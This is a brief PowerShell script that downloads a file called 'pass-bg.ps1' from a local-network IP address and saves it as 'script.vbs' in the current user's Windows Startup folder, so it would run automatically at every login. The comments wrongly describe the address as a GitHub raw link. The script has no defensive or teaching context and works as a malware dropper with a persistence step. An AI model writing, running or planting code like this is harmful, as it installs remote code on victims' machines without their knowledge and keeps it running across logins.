# Define the GitHub raw link of the PowerShell script
$githubRawLink = "http://192.168.0.107/dev/pass-bg.ps1"

# Define the path to the startup folder
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the filename for the downloaded script
$scriptFilename = "script.vbs"

# Combine the startup folder path with the script filename
$destinationPath = Join-Path -Path $startupFolder -ChildPath $scriptFilename

# Download the script from GitHub
Invoke-WebRequest -Uri $githubRawLink -OutFile $destinationPath

# Check if the download was successful
if (Test-Path $destinationPath) {
    Write-Host "Script downloaded and saved to startup folder successfully."
} else {
    Write-Host "Failed to download or save the script."
}
